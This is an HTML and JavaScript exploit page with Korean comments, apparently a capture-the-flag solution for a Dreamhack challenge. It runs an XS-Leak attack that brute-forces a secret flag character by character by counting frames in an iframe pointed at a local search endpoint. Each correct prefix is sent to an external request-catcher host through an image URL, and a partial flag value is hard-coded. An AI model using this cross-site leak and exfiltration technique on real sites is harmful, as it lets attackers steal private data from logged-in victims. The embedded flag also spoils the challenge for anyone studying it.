<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {     // Promise는 비동기 작업(iframe 로드 완료 여부 확인)을 관리하는 객체
            const iframe = document.getElementById("iframe");
            iframe.src = url;   // 브라우저의 iframe 요소를 통해 지정된 URL로 요청을 보냄
            iframe.onload = () => {     // iframe이 URL을 로드하면 트리거되는 이벤트 핸들러.
                if(iframe.contentWindow.frames.length != 0)
                    return resolve();   // iframe 내부에 하위 프레임이 있으면 Promise를 성공(resolve) 상태로 완료.
                else
                    return reject();    // 그렇지 않으면 Promise를 실패(reject) 상태로 완료.
            };
        });
    }

    async function search(query) {
        try{
            await req(`http://localhost:8000/search?query=${query}`);   // query값을 포함해 HTTP요청 전송
            return true;    // 응답
        } catch (e) {
            return false;
        }
    }

    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{22d1445ad68e194e044a16dc644371f3";    // 정답. 셀레니움 요청 지속시간이 3초라 플래그값 추가해가면서 요청하였음

        while(!secret.includes("}")) {
            for(let c of chars) {
                if(await search(secret + c)){  // 응답이 있으면? 'c'를 추가한 검색결과는 옳은 것
                    secret += c;
                    img.src = `https://jgpydjs.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
    
    exploit();
</script>
